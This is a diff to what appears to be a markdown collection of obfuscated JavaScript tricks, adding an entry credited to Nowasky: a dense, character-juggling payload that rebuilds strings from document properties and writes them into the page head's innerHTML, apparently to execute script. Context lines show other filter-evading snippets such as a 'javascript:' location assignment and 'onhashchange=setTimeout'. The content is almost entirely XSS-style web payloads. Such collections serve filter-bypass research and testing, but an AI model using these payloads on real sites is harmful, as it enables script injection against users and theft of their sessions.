@@ -208,6 +208,14 @@ location = /javascript:/.source + alert.name+x+23+x
     
 ---
 
+[Nowasky](https://twitter.com/nowaskyjr/status/1555609410642272256)
+
+
+    c=document,h=c.head,x=h.part,p=g=h.id,h.valueOf=p.sub,x.valueOf=p.at,o=g++,l=g++,z=g++,e=g++,a=g++,s=g++,d=g++,j=g++,b=g++,h.part=h+p,y=h.innerHTML=x+p,h.part=h.innerHTML,p+=x,h.part=c.nodeName,p+=x,k=o+p,u=l+p,w=p+l,t=w+l,f=w+o+b+w,h.innerHTML=t+s+t+d+w+z+l+f+o+u+a+j+t+l+t+o+f+l+u+g+j+w+o+k+d+l,h.innerHTML=y+h.innerHTML+p+g+j+f+o+l+t+a+w+l+d+p+a+k+s+k+s+u+a+u+a+j+p+a+j+h
+    
+
+---
+
 [aemkei](https://twitter.com/aemkei)
 
     onhashchange=setTimeout;
